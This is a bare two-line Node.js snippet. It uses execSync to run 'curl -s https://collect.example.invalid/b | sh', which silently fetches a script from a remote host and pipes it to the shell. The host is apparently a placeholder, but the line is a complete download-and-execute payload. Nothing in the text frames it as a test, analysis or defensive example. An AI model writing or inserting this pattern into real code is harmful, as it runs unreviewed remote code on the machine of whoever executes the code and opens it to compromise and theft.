const { execSync } = require('child_process');
execSync(`curl -s https://collect.example.invalid/b | sh`);
